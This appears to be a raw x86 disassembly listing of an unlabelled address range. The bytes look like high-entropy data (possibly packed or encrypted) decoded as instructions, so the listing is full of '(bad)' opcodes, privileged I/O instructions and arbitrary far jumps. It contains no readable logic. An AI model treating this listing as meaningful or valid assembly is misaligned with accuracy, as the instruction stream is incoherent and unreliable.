  41bbec:	sbb    eax,0xb2ae24e8
  41bbf1:	stc    
  41bbf2:	ds sbb eax,0xff99797b
  41bbf8:	add    edi,DWORD PTR [esi]
  41bbfa:	fcom   QWORD PTR [edx-0x4a]
  41bbfd:	add    eax,0xaaa958cd
  41bc02:	sub    bl,dh
  41bc04:	or     eax,eax
  41bc06:	dec    edx
  41bc07:	inc    edx
  41bc08:	push   eax
  41bc09:	rcl    dh,0xdc
  41bc0c:	add    edx,DWORD PTR [ecx-0x27e04acc]
  41bc12:	xchg   esi,eax
  41bc13:	dec    esp
  41bc14:	retf   0x758b
  41bc17:	sub    al,0x19
  41bc19:	push   0x483a4420
  41bc1e:	stos   DWORD PTR es:[edi],eax
  41bc1f:	xchg   ecx,eax
  41bc20:	mov    ch,0x3b
  41bc22:	mov    WORD PTR [eax-0x46],es
  41bc25:	add    eax,0x34079e04
  41bc2a:	cmp    DWORD PTR [ecx],edx
  41bc2c:	jge    0x41bc6c
  41bc2e:	jle    0x41bbf4
  41bc30:	push   esi
  41bc31:	stos   BYTE PTR es:[edi],al
  41bc32:	ror    DWORD PTR [edi],1
  41bc34:	idiv   BYTE PTR [ebx]
  41bc36:	jno    0x41bbe1
  41bc38:	dec    esp
  41bc39:	shr    DWORD PTR [edi+0x22],0x2e
  41bc3d:	aas    
  41bc3e:	shr    esi,cl
  41bc40:	lods   al,BYTE PTR ds:[esi]
  41bc41:	pusha  
  41bc42:	lods   al,BYTE PTR ds:[esi]
  41bc43:	xlat   BYTE PTR ds:[ebx]
  41bc44:	and    eax,0x586c236
  41bc49:	call   0x88ad3472
  41bc4e:	mov    esi,0xb8ccf18e
  41bc53:	dec    edi
  41bc54:	sbb    dl,0x96
  41bc57:	add    BYTE PTR [ecx-0x63],al
  41bc5a:	mov    ecx,0xe41df719
  41bc5f:	ror    dh,cl
  41bc61:	cmp    eax,0x3e8b0a1d
  41bc66:	aaa    
  41bc67:	pop    ecx
  41bc68:	cmp    eax,0xc2792eaf
  41bc6d:	jns    0x41bccc
  41bc6f:	jmp    0x626ba324
  41bc74:	sub    edx,DWORD PTR [esi+0xd41caeb]
  41bc7a:	ret    0xeeb3
  41bc7d:	mov    al,0xa9
  41bc7f:	pop    ds
  41bc80:	ss int 0xe4
  41bc83:	adc    esp,ebx
  41bc85:	push   edx
  41bc86:	into   
  41bc87:	sbb    BYTE PTR [ebx+0x3803bbf1],ch
  41bc8d:	or     DWORD PTR [edx+0x5d],esp
  41bc90:	sub    eax,0x894c3ca4
  41bc95:	ret    0x3769
  41bc98:	bound  edx,QWORD PTR [edx+eiz*4+0x57c35d6a]
  41bc9f:	xor    cl,cl
  41bca1:	pop    ebp
  41bca2:	pop    ebx
  41bca3:	push   0x1e
  41bca5:	and    eax,0x9228c0d9
  41bcaa:	outs   dx,BYTE PTR ds:[esi]
  41bcab:	(bad)  
  41bcac:	jle    0x41bcfe
  41bcae:	out    0x21,eax
  41bcb0:	xchg   ebp,eax
  41bcb1:	jp     0x41bc5c
  41bcb3:	or     eax,0x27158c79
  41bcb8:	jmp    0x1b88:0xcf826d0d
  41bcbf:	call   0x830a3f98
  41bcc4:	push   ss
  41bcc5:	ss jbe 0x41bc4a
  41bcc8:	gs push edi
  41bcca:	pusha  
  41bccb:	sbb    edx,DWORD PTR [edx-0x35b55efe]
  41bcd1:	mov    bh,0x9c
  41bcd3:	mov    BYTE PTR [ebp-0x75],bl
  41bcd6:	sti    
  41bcd7:	test   cl,ah
  41bcd9:	out    0x6e,eax
  41bcdb:	dec    esp
  41bcdc:	outs   dx,DWORD PTR ds:[esi]
  41bcdd:	xor    BYTE PTR [eax],dl
  41bcdf:	ja     0x41bc90
  41bce1:	inc    eax
  41bce2:	sbb    dl,BYTE PTR [ecx+edi*2]
  41bce5:	addr16 daa 
  41bce7:	je     0x41bcdb
  41bce9:	sahf   
  41bcea:	loope  0x41bd25
  41bcec:	pop    esi
  41bced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcee:	fild   QWORD PTR [esi-0x6f]
  41bcf1:	sbb    bl,BYTE PTR [edi+0x12]
  41bcf4:	shl    edi,0x8b
  41bcf7:	repnz push esp
  41bcf9:	cmp    DWORD PTR [eax+0x44d6d3a8],esi
  41bcff:	js     0x41bcee
  41bd01:	jmp    0x7477a945
  41bd06:	pop    edx
  41bd07:	jae    0x41bd0a
  41bd09:	push   esp
  41bd0a:	ret    
  41bd0b:	lods   eax,DWORD PTR ds:[esi]
  41bd0c:	push   es
  41bd0d:	xor    dh,BYTE PTR [ebx]
  41bd0f:	bound  esi,QWORD PTR [ebp-0xd3df560]
  41bd15:	fist   WORD PTR [edx]
  41bd17:	(bad)  
  41bd18:	hlt    
  41bd19:	hlt    
  41bd1a:	xchg   ecx,eax
  41bd1b:	(bad)  
  41bd1c:	fnstsw WORD PTR [edi-0x1d8799e5]
  41bd22:	mov    DWORD PTR [edx+0x62f36c31],edi
  41bd28:	xchg   edi,eax
  41bd29:	fmul   DWORD PTR [ecx-0x65]
  41bd2c:	push   esi
  41bd2d:	rcr    DWORD PTR [ecx-0x1b],cl
  41bd30:	outs   dx,DWORD PTR ds:[esi]
  41bd31:	int3   
  41bd32:	xchg   edi,eax
  41bd33:	push   ss
  41bd34:	sbb    al,0x38
  41bd36:	mov    al,al
  41bd38:	dec    esi
  41bd39:	stos   BYTE PTR es:[edi],al
  41bd3a:	sub    al,BYTE PTR [edx+0x32f1117a]
  41bd40:	xor    dh,BYTE PTR [edx+0x5c]
  41bd43:	fwait
  41bd44:	in     eax,dx
  41bd45:	js     0x41bd27
  41bd47:	rol    BYTE PTR [esi],cl
  41bd49:	ror    BYTE PTR [ecx],1
  41bd4b:	adc    DWORD PTR [esi-0x67],0x3031374a
  41bd52:	in     al,dx
  41bd53:	stos   DWORD PTR es:[edi],eax
  41bd54:	cmp    ch,BYTE PTR [edi+0x45]
  41bd57:	mov    dh,0x73
  41bd59:	into   
  41bd5a:	mov    cs,WORD PTR [edx+0x69bacbaf]
  41bd60:	fld    QWORD PTR [eax+edi*2-0x7e]
  41bd64:	cmp    eax,0x20e1f1ec
  41bd69:	mov    BYTE PTR [edx+0x7f],al
  41bd6c:	ror    DWORD PTR [esi+0x32],1
  41bd6f:	mov    ds:0xd991295d,al
  41bd74:	(bad)
  41bd78:	pop    ebp
  41bd79:	adc    edx,DWORD PTR [esi+0x6b]
  41bd7c:	or     edi,edi
  41bd7e:	mov    ebp,0x45738a0f
  41bd83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd84:	sub    ebp,DWORD PTR [edi-0x6851701d]
  41bd8a:	jne    0x41bd43
  41bd8c:	sub    eax,ebx
  41bd8e:	inc    edx
  41bd8f:	repz es icebp 
  41bd92:	or     al,0x9c
  41bd94:	push   ss
  41bd95:	push   ebp
  41bd96:	neg    DWORD PTR [edx+0x7a]
  41bd99:	fdiv   DWORD PTR [esi+ebp*8-0x75]
  41bd9d:	fs push es
  41bd9f:	gs pop esp
  41bda1:	aad    0x20
  41bda3:	add    BYTE PTR [esp+ebx*1],dl
  41bda6:	scas   al,BYTE PTR es:[edi]
  41bda7:	dec    esp
  41bda8:	ins    BYTE PTR es:[edi],dx
  41bda9:	hlt    
  41bdaa:	mov    esi,ds
  41bdac:	in     eax,dx
  41bdad:	lea    ecx,[eax+0x2f]
  41bdb0:	sub    DWORD PTR [edi],esp
  41bdb2:	outs   dx,BYTE PTR ds:[esi]
  41bdb3:	nop
  41bdb4:	retf   
  41bdb5:	idiv   BYTE PTR [ebx+0x2fe5b50]
  41bdbb:	mov    BYTE PTR [edx],ch
  41bdbd:	mov    dh,0x99
  41bdbf:	mov    WORD PTR [edx-0x69ff5bcd],ss
  41bdc5:	clc    
  41bdc6:	fucomi st,st(7)
  41bdc8:	jl     0x41be39
  41bdca:	mov    eax,ds:0xab21ec02
  41bdcf:	xor    al,0x62
  41bdd1:	jne    0x41be3a
  41bdd3:	mov    ebp,0xe405be3b
  41bdd8:	sub    eax,ebp
  41bdda:	inc    ebp
  41bddb:	mov    eax,ds:0xb8e70cb2
  41bde0:	push   eax
  41bde1:	sbb    BYTE PTR [edx+edx*8-0x5],cl
  41bde5:	rcr    DWORD PTR [ebp+0x59efe5fd],cl
  41bdeb:	nop
  41bdec:	push   0x4b
  41bdee:	ja     0x41bdda
  41bdf0:	push   dx
  41bdf2:	out    dx,eax
  41bdf3:	adc    BYTE PTR [ecx+0x38],cl
  41bdf6:	mov    ah,0xac
  41bdf8:	jbe    0x41bdb0
  41bdfa:	or     DWORD PTR [ecx-0x5bc4ab66],ebp
  41be00:	fist   DWORD PTR [ecx+0x26]
  41be03:	shl    BYTE PTR [ebx+0x7565de42],1
  41be09:	stc    
  41be0a:	std    
  41be0b:	and    eax,0xe8e1fec2
  41be10:	and    eax,0x87630bd9
  41be15:	mov    al,ds:0x972a49e8
  41be1a:	mov    dl,0xd7
  41be1c:	and    al,0x4d
  41be1e:	and    ebx,DWORD PTR [esi+ecx*1-0x43cc0bf2]
  41be25:	jecxz  0x41bddb
  41be27:	scas   al,BYTE PTR es:[edi]
  41be28:	imul   eax,DWORD PTR [edx],0x4
  41be2b:	pop    edx
  41be2c:	std    
  41be2d:	leave  
  41be2e:	(bad)  
  41be2f:	jle    0x41be38
  41be31:	scas   eax,DWORD PTR es:[edi]
  41be32:	push   ds
  41be33:	jns    0x41be19
  41be35:	push   0x81f846b9
  41be3a:	pop    edi
  41be3b:	xchg   BYTE PTR [ebp+0x1533dea5],ah
  41be41:	xchg   ebp,eax
  41be42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be43:	fidiv  WORD PTR [eax-0x5e]
  41be46:	pop    ss
  41be47:	or     ebx,DWORD PTR [ebp+0x55833c80]
  41be4d:	add    ebp,edx
  41be4f:	int3   
  41be50:	mov    BYTE PTR [edx-0xf],ch
  41be53:	mov    esi,0xdc04ecf5
  41be58:	pop    ss
  41be59:	sub    DWORD PTR [edi+0x61558d35],esi
  41be5f:	lods   eax,DWORD PTR ds:[esi]
  41be60:	cmp    DWORD PTR [ebx-0x669521dc],ebp
  41be66:	fdiv   QWORD PTR [edi+0x7]
  41be69:	in     al,0x73
  41be6b:	mov    ecx,0x1675bbb8
  41be70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be71:	aaa    
  41be72:	pop    ds
  41be73:	fisub  DWORD PTR [esi-0x72]
  41be76:	push   edi
  41be77:	test   al,0xc6
  41be79:	sub    DWORD PTR [ebx+0x29aa74df],edx
  41be7f:	cli    
  41be80:	cmp    bh,BYTE PTR [eax]
  41be82:	out    0xbe,eax
  41be84:	add    bh,BYTE PTR [ebx+edi*2]
  41be87:	jne    0x41beb3
  41be89:	push   esi
  41be8a:	jl     0x41beca
  41be8c:	adc    DWORD PTR [ebx-0x40],ebp
  41be8f:	outs   dx,BYTE PTR ds:[esi]
  41be90:	adc    eax,0x3703406f
  41be95:	imul   DWORD PTR [ebx]
  41be97:	jle    0x41be87
  41be99:	shr    dl,cl
  41be9b:	xchg   bl,ah
  41be9d:	clts   
  41be9f:	into   
  41bea0:	iret   
  41bea1:	mov    dl,0xb1
  41bea3:	mov    eax,0xcfc8c52f
  41bea8:	sub    ah,dl
  41beaa:	dec    esp
  41beab:	lahf   
  41beac:	gs ins DWORD PTR es:[edi],dx
  41beae:	das    
  41beaf:	out    0xfc,al
  41beb1:	fistp  DWORD PTR [eax]
  41beb3:	mov    ecx,0x7c879b38
  41beb8:	xchg   esi,eax
  41beb9:	or     DWORD PTR [ecx+0x4b],ebp
  41bebc:	test   DWORD PTR [edi-0x2da52b79],ecx
  41bec2:	pop    ecx
  41bec3:	fwait
  41bec4:	ret    
  41bec5:	aad    0x62
  41bec7:	outs   dx,DWORD PTR ds:[esi]
  41bec8:	inc    DWORD PTR [ebx-0x4e]
  41becb:	fistp  QWORD PTR [esi-0x7fe05285]
  41bed1:	inc    edx
  41bed2:	xchg   BYTE PTR [esi+eax*2-0x5d9e4550],ch
  41bed9:	adc    DWORD PTR [ebx+esi*8-0x6d],eax
  41bedd:	xchg   DWORD PTR [ecx+0x69],esi
  41bee0:	inc    edi
  41bee1:	cmp    ebx,DWORD PTR [ecx+0x30373d46]
  41bee7:	outs   dx,DWORD PTR ds:[esi]
  41bee8:	int3   
  41bee9:	push   ebp
  41beea:	ds push ecx
  41beec:	call   0x1923bf4b
  41bef1:	mov    ecx,DWORD PTR [edx+edx*1-0x4050138b]
  41bef8:	stos   DWORD PTR es:[edi],eax
  41bef9:	scas   al,BYTE PTR es:[edi]
  41befa:	test   BYTE PTR [edi+0x3bd4468a],ch
  41bf00:	push   es
  41bf01:	add    eax,0xf387d5d5
  41bf06:	loopne 0x41bf42
  41bf08:	xlat   BYTE PTR ds:[ebx]
  41bf09:	inc    ebx
  41bf0a:	dec    esi
  41bf0b:	pusha  
  41bf0c:	mov    ds:0x9384b91e,eax
  41bf11:	mul    BYTE PTR [edx+0x1af0a1b0]
  41bf17:	and    ebp,DWORD PTR [eax+0x2201c927]
  41bf1d:	scas   eax,DWORD PTR es:[edi]
  41bf1e:	cmp    edx,ebx
  41bf20:	and    DWORD PTR [esi],esi
  41bf22:	push   0xffffffb5
  41bf24:	xchg   ebp,eax
  41bf25:	sub    eax,0x68691189
  41bf2a:	inc    ebx
  41bf2b:	(bad)  
  41bf2c:	out    dx,eax
  41bf2d:	repz pusha 
  41bf2f:	and    ch,BYTE PTR [edx]
  41bf31:	jno    0x41bf52
  41bf33:	gs mov esi,fs
  41bf36:	cmp    BYTE PTR ds:0x8c2290db,cl
  41bf3c:	dec    esp
  41bf3d:	or     eax,0xd0c47514
  41bf42:	not    DWORD PTR [ebx-0x6e9abd7b]
  41bf48:	xchg   ebx,eax
  41bf49:	fnsave [ebx-0x2]
  41bf4c:	xor    eax,0x2e62914e
  41bf51:	adc    esi,DWORD PTR [esi]
  41bf53:	cmp    BYTE PTR [edx+0x5071a758],0x6c
  41bf5a:	scas   al,BYTE PTR es:[edi]
  41bf5b:	mov    cl,0x6f
  41bf5d:	or     al,0xe2
  41bf5f:	cmp    BYTE PTR ds:0xfd9d8122,bh
  41bf65:	rcl    BYTE PTR [ebp-0x412659c7],0xff
  41bf6c:	mov    esp,0x6e719984
  41bf71:	retf   0x44b
  41bf74:	push   0xf63776e2
  41bf79:	cmp    ebx,DWORD PTR [ecx+0x6b]
  41bf7c:	push   es
  41bf7d:	push   es
  41bf7e:	aad    0x93
  41bf80:	dec    ebp
  41bf81:	into   
  41bf82:	adc    ah,0x6d
  41bf85:	lock lods eax,DWORD PTR ds:[esi]
  41bf87:	cmp    BYTE PTR [esi-0x6c8e22d9],ch
  41bf8d:	dec    edx
  41bf8e:	sub    DWORD PTR [ebx+0x71],eax
  41bf91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf92:	mov    bl,0x9c
  41bf94:	pusha  
  41bf95:	xor    DWORD PTR [esi],ebp
  41bf97:	push   ecx
  41bf98:	jne    0x41bfbd
  41bf9a:	dec    edi
  41bf9b:	xchg   edx,eax
  41bf9c:	js     0x41bfb3
  41bf9e:	test   DWORD PTR [esi+0x70],eax
  41bfa1:	mov    eax,ds:0x10aa6069
  41bfa6:	cmp    ch,BYTE PTR ds:0x1008e0c6
  41bfac:	or     BYTE PTR [esi-0x7a],bl
  41bfaf:	mov    esi,0xf451ca7f
  41bfb4:	sub    eax,0x5ab33606
  41bfb9:	mov    bl,0x77
  41bfbb:	fwait
  41bfbc:	pop    ecx
  41bfbd:	fldenv [ecx]
  41bfbf:	cmp    eax,0x1abbf707
  41bfc4:	rcl    BYTE PTR [ebp-0x56],cl
  41bfc7:	sbb    al,0xee
  41bfc9:	rol    BYTE PTR [ebx],1
  41bfcb:	in     al,0xe4
  41bfcd:	ror    al,0x9
  41bfd0:	(bad)  
  41bfd1:	rcl    BYTE PTR [edi+0x10aae07c],0x3a
  41bfd8:	call   0x92eb:0x6595d2b6
  41bfdf:	dec    edi
  41bfe0:	test   eax,0xb6c42073
  41bfe5:	push   0x633e958f
  41bfea:	xchg   ebp,eax
  41bfeb:	retf   0xc09d
  41bfee:	mov    esi,0xcea4d2fb
  41bff3:	xchg   edx,eax
  41bff4:	into   
  41bff5:	or     bl,BYTE PTR [ecx+0x21]
  41bff8:	cli    
  41bff9:	into   
  41bffa:	idiv   DWORD PTR [eax]
  41bffc:	inc    eax
  41bffd:	jmp    0x100f:0x82476653
  41c004:	(bad)  
  41c005:	cmp    ch,BYTE PTR [esi-0x58]
  41c008:	popa   
  41c009:	jae    0x41c060
  41c00b:	gs inc edx
  41c00d:	mov    ebp,0x74d4f15c
  41c012:	out    dx,eax
  41c013:	cdq    
  41c014:	push   ecx
  41c015:	pop    ebx
  41c016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c017:	dec    edi
  41c018:	pop    es
  41c019:	enter  0x87a5,0x68
  41c01d:	iret   
  41c01e:	and    DWORD PTR [ebx],esp
  41c020:	sub    DWORD PTR [esi-0x4],esi
  41c023:	mov    al,0xfd
  41c025:	shl    DWORD PTR [edi],1
  41c027:	add    al,0x17
  41c029:	enter  0x74d0,0x2c
  41c02d:	cmp    ch,BYTE PTR [ebp-0x63f721aa]
  41c033:	jp     0x41c046
  41c035:	or     al,BYTE PTR [esi+0x51680ed6]
  41c03b:	ret    
  41c03c:	mov    al,0x53
  41c03e:	ror    DWORD PTR [ebp+ebp*1-0x4dc51963],1
  41c045:	sbb    al,0x2d
  41c047:	shr    al,cl
  41c049:	jnp    0x41c091
  41c04b:	cmp    dh,al
  41c04d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c04e:	and    eax,0x3c988ec2
  41c053:	mov    ecx,0x46c67230
  41c058:	cmp    ch,BYTE PTR [ecx+edx*1]
  41c05b:	push   es
  41c05c:	mov    WORD PTR [edi],ds
  41c05e:	es sub eax,0x2cfbc12b
  41c064:	rol    BYTE PTR [edx+0x7],1
  41c067:	mov    eax,0x18964b32
  41c06c:	(bad)  
  41c06d:	mov    ds:0xce0e9817,al
  41c072:	in     al,dx
  41c073:	cli    
  41c074:	push   edi
  41c075:	mov    DWORD PTR [esi+ebx*1+0x68417997],eax
  41c07c:	cmp    bh,ch
  41c07e:	xchg   edi,eax
  41c07f:	lea    edx,[eax*4+0x46b3f02f]
  41c086:	mov    ah,BYTE PTR [ebx]
  41c088:	cmp    BYTE PTR [ebp+eiz*1+0x6d],ch
  41c08c:	fwait
  41c08d:	jecxz  0x41c0c4
  41c08f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c090:	lods   al,BYTE PTR ds:[esi]
  41c091:	stos   BYTE PTR es:[edi],al
  41c092:	xchg   ecx,eax
  41c093:	and    ch,BYTE PTR [esi]
  41c095:	cli    
  41c096:	inc    esi
  41c097:	outs   dx,DWORD PTR ds:[esi]
  41c098:	div    BYTE PTR [edi]
  41c09a:	mov    ebp,0x9e173514
  41c09f:	cmp    ecx,DWORD PTR [edi]
  41c0a1:	pop    edi
  41c0a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0a3:	in     eax,dx
  41c0a4:	popa   
  41c0a5:	xor    dl,BYTE PTR [edx+0x1e]
  41c0a8:	inc    edi
  41c0a9:	call   0x5922b358
  41c0ae:	sub    ch,bl
  41c0b0:	daa    
  41c0b1:	out    dx,al
  41c0b2:	dec    edi
  41c0b3:	jge    0x41c087
  41c0b5:	and    edx,DWORD PTR [eax]
  41c0b7:	mov    eax,0x1d8d69dc
  41c0bc:	jbe    0x41c0d8
  41c0be:	mov    BYTE PTR [esi],bh
  41c0c0:	lds    esi,FWORD PTR [ecx+0xb0497e5]
  41c0c6:	inc    BYTE PTR [ebx]
  41c0c8:	aam    0x2c
  41c0ca:	pop    ebp
  41c0cc:	jno    0x41c097
  41c0ce:	iret   
  41c0cf:	hlt    
  41c0d0:	sub    al,0x13
  41c0d2:	push   ds
  41c0d3:	inc    edi
  41c0d4:	lahf   
  41c0d5:	lahf   
  41c0d6:	inc    esp
  41c0d7:	mov    bh,0x1a
  41c0d9:	dec    esi
  41c0da:	ret    0x7713
  41c0dd:	pusha  
  41c0de:	shr    BYTE PTR [ebp+0x25],0xb0
  41c0e2:	xchg   esi,eax
  41c0e3:	call   0x9cc46540
  41c0e8:	lahf   
  41c0e9:	jg     0x41c163
  41c0eb:	leave  
  41c0ec:	dec    esi
  41c0ed:	ficomp DWORD PTR [ebp-0x6df5cd0b]
  41c0f3:	sub    BYTE PTR [ebx-0x32],dl
  41c0f6:	fmul   QWORD PTR [eax+0x1d]
  41c0f9:	xor    eax,0xcbf387c5
  41c0fe:	stos   DWORD PTR es:[edi],eax
  41c0ff:	adc    ebx,DWORD PTR [edx+0x7e5fa366]
  41c105:	xor    eax,0x55852326
  41c10a:	jecxz  0x41c0ae
  41c10c:	test   eax,0x89f0cf95
  41c111:	cdq    
  41c112:	jb     0x41c0d4
  41c114:	test   DWORD PTR [esp+ebp*8],eax
  41c117:	pop    ecx
  41c118:	in     eax,dx
  41c119:	jns    0x41c0b3
  41c11b:	(bad)  
  41c11c:	or     BYTE PTR [ebx],bl
  41c11e:	stos   DWORD PTR es:[edi],eax
  41c11f:	or     eax,0xd0a7f914
  41c124:	push   edi
  41c125:	mov    esi,0x2449b266
  41c12a:	jge    0x41c180
  41c12c:	mov    dl,0x85
  41c12e:	sar    ebx,1
  41c130:	(bad)  
  41c131:	xchg   ecx,eax
  41c132:	xor    BYTE PTR [esi],ch
  41c134:	xor    eax,0xd28c104a
  41c139:	pop    ecx
  41c13a:	sbb    DWORD PTR [ecx+0x21],edi
  41c13d:	xor    DWORD PTR ss:[eax+0x4e],eax
  41c141:	mov    cl,0x92
  41c143:	mov    cl,BYTE PTR ds:0xca8d3f4
  41c149:	add    DWORD PTR [eax+0x14810baa],ecx
  41c14f:	test   eax,0x89c859b1
  41c154:	pop    ebp
  41c155:	bswap  ecx
  41c157:	mov    ch,0x27
  41c159:	rcl    esi,1
  41c15b:	pop    esp
  41c15c:	rcr    BYTE PTR [esi+eax*1-0x2f906452],0x3a
  41c164:	xor    BYTE PTR [eax+0x1c8e2aab],0x3b
  41c16b:	inc    ecx
  41c16c:	or     ebx,0x8260c1e6
  41c172:	adc    edx,eax
  41c174:	sti    
  41c175:	inc    ecx
  41c176:	cs cmp esi,esi
  41c179:	pushf  
  41c17a:	or     ebp,DWORD PTR ds:0x7979c9b9
  41c180:	stos   BYTE PTR es:[edi],al
  41c181:	dec    ebp
  41c182:	push   esp
  41c183:	iret   
  41c184:	dec    eax
  41c185:	jno    0x41c1bc
  41c187:	fld    QWORD PTR [edx]
  41c189:	xchg   BYTE PTR [edi+0x55],dl
  41c18c:	repnz inc esp
  41c18e:	jae    0x41c1ac
  41c190:	pop    esi
  41c191:	ja     0x41c1cb
  41c193:	iret   
  41c194:	ins    DWORD PTR es:[edi],dx
  41c195:	sub    al,0x12
  41c197:	lea    ebx,[ebx-0x77]
  41c19a:	push   es
  41c19b:	xor    cl,ch
  41c19d:	jae    0x41c216
  41c19f:	jecxz  0x41c146
  41c1a1:	rcr    DWORD PTR [esi],0x1f
  41c1a4:	in     eax,dx
  41c1a5:	add    ecx,ecx
  41c1a7:	int    0xce
  41c1a9:	mov    edi,0xefd07b7b
  41c1ae:	cmp    dl,BYTE PTR [edx+0x4e]
  41c1b1:	popa   
  41c1b2:	lock pop edi
  41c1b4:	sub    DWORD PTR [edi],0xffffffd2
  41c1b7:	imul   BYTE PTR [ebx-0x75]
  41c1ba:	jmp    0x6100:0xdeb7dd20
  41c1c1:	std    
  41c1c2:	mov    edi,0x12d9eeeb
  41c1c7:	push   ss
  41c1c8:	iret   
  41c1c9:	add    cl,bh
  41c1cb:	push   cs
  41c1cc:	stos   DWORD PTR es:[edi],eax
  41c1cd:	dec    ecx
  41c1ce:	pushf  
  41c1cf:	test   al,0x4e
  41c1d1:	div    dh
  41c1d3:	aaa    
  41c1d4:	(bad)  
  41c1d5:	mov    ch,0x77
  41c1d7:	inc    esi
  41c1d8:	jb     0x41c175
  41c1da:	sub    BYTE PTR [edi-0x69],cl
  41c1dd:	cld    
  41c1de:	xchg   ebp,eax
  41c1df:	or     edi,edx
  41c1e1:	mov    dh,0xe
  41c1e3:	gs cmp al,0xcf
  41c1e6:	push   esi
  41c1e7:	cmp    BYTE PTR [edx-0xe],0x87
  41c1eb:	(bad)  
  41c1ec:	sbb    BYTE PTR [ecx],ah
  41c1ee:	les    eax,FWORD PTR [ecx-0x3c11f4c4]
  41c1f4:	mov    WORD PTR [ecx+0x1d823187],?
  41c1fa:	push   esp
  41c1fb:	inc    ebp
  41c1fc:	call   0x945e:0x3c19c19b
  41c203:	xchg   edx,eax
  41c204:	aas    
  41c205:	xor    eax,0x42b278d0
  41c20a:	movd   ecx,mm2
  41c20d:	lahf   
  41c20e:	call   0x6ff2cec
  41c213:	mov    bl,0xe4
  41c215:	popa   
  41c216:	xchg   BYTE PTR [ebx-0xa],dl
  41c219:	push   eax
  41c21a:	adc    BYTE PTR [ebx-0xad91731],0x66
  41c221:	lods   al,BYTE PTR ds:[esi]
  41c222:	out    dx,eax
  41c223:	daa    
  41c224:	out    dx,al
  41c225:	and    al,0x14
  41c227:	repz xchg esi,eax
  41c229:	fisubr DWORD PTR [eax-0x2b]
  41c22c:	push   ebx
  41c22d:	mov    al,ds:0x5f312863
  41c232:	imul   esi,DWORD PTR [edx],0x76802d9c
  41c238:	ja     0x41c228
  41c23a:	xchg   al,dl
  41c23c:	sub    BYTE PTR [edi],bh
  41c23e:	add    DWORD PTR [esi-0x2d447715],edx
  41c244:	or     al,cl
  41c246:	iret   
  41c247:	sub    eax,0x7d656bc6
  41c24c:	adc    eax,0x5602f19a
  41c251:	jmp    0x41c1eb
  41c253:	shr    DWORD PTR [edi-0x5c],0xea
  41c257:	iret   
  41c258:	lods   al,BYTE PTR ds:[esi]
  41c259:	daa    
  41c25a:	cs repnz push es
  41c25d:	(bad)  
  41c25e:	jmp    0x41c222
  41c260:	aam    0x26
  41c262:	enter  0x21a6,0xa4
  41c266:	jl     0x41c277
  41c268:	xor    esi,DWORD PTR [eax-0x3e128b7c]
  41c26e:	ins    BYTE PTR es:[edi],dx
  41c26f:	xlat   BYTE PTR ds:[ebx]
  41c270:	sti    
  41c271:	sbb    al,0x52
  41c273:	clc    
  41c274:	mov    ss,edx
  41c276:	xchg   ebp,eax
  41c277:	inc    esi
  41c278:	or     al,0x51
  41c27a:	jns    0x41c2a3
  41c27c:	push   esi
  41c27d:	out    dx,al
  41c27e:	pop    ecx
  41c27f:	imul   edx,ecx,0x2
  41c282:	mov    eax,0x4c41925a
  41c287:	sub    ch,ch
  41c289:	mov    al,0xf4
  41c28b:	je     0x41c2b4
  41c28d:	test   BYTE PTR [ebx],cl
  41c28f:	aaa    
  41c290:	dec    ebx
  41c291:	in     al,dx
  41c292:	out    dx,eax
  41c293:	or     edx,edx
  41c295:	fs dec ebx
  41c297:	mov    ebp,0xf8bcccfe
  41c29c:	stc    
  41c29d:	xchg   DWORD PTR [ecx+0x6],ebx
  41c2a0:	loope  0x41c2c2
  41c2a2:	retf   
  41c2a3:	xchg   DWORD PTR [edx-0x35],ebp
  41c2a6:	push   cs
  41c2a7:	int3   
  41c2a8:	dec    esp
  41c2a9:	sub    DWORD PTR [ebp+0x31c6ba01],edx
  41c2af:	pop    es
  41c2b0:	push   esp
  41c2b1:	pop    edx
  41c2b2:	(bad)  
  41c2b3:	lods   al,BYTE PTR ds:[esi]
  41c2b4:	jb     0x41c2d4
  41c2b6:	push   ebx
  41c2b7:	rcr    BYTE PTR [eax-0x79],cl
  41c2ba:	nop
  41c2bb:	pop    ebp
  41c2bc:	sar    esp,0x3e
  41c2bf:	pop    ecx
  41c2c0:	add    BYTE PTR [ebx],0xcf
  41c2c3:	aad    0xf9
  41c2c5:	(bad)  
  41c2c6:	and    al,BYTE PTR ds:0x46821450
  41c2cc:	dec    edi
  41c2cd:	es add bl,bh
  41c2d0:	hlt    
  41c2d1:	iret   
  41c2d2:	sub    ah,dl
  41c2d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2d5:	jl     0x41c331
  41c2d7:	pop    ebx
  41c2d8:	xchg   edx,eax
  41c2d9:	and    al,0xcd
  41c2db:	int    0x98
  41c2dd:	js     0x41c2ed
  41c2df:	out    dx,eax
  41c2e0:	fwait
  41c2e1:	sbb    eax,0x1c33b068
  41c2e6:	aad    0xec
  41c2e8:	mov    edi,0xf60a2777
  41c2ed:	in     eax,0x46
  41c2ef:	push   0xba0a4ca4
  41c2f4:	jne    0x41c36e
  41c2f6:	lea    ebp,[esp+eax*4]
  41c2f9:	and    esi,ecx
  41c2fb:	add    DWORD PTR [ecx-0x518bea74],edi
  41c301:	es lahf 
  41c303:	addr16 aaa 
  41c305:	jecxz  0x41c2b8
  41c307:	jns    0x41c2b0
  41c309:	test   al,0xa
  41c30b:	mov    ebp,0xe1ed8a64
  41c310:	sbb    DWORD PTR [esi+esi*2-0x2346c671],edx
  41c317:	push   esi
  41c318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c319:	lahf   
  41c31a:	or     ebp,DWORD PTR [eax]
  41c31c:	sbb    DWORD PTR [ecx-0x29],edi
  41c31f:	mov    ds:0xabc92de9,eax
  41c324:	dec    edx
  41c325:	test   eax,0x491a8e4a
  41c32a:	mov    esp,0xabc64ba4
  41c32f:	push   0xffffffa8
  41c331:	xchg   DWORD PTR [edi+eiz*8+0x4cb078ca],esi
  41c338:	ja     0x41c37a
  41c33a:	xor    al,0x2d
  41c33c:	and    DWORD PTR [ecx+0x38c79acb],ebx
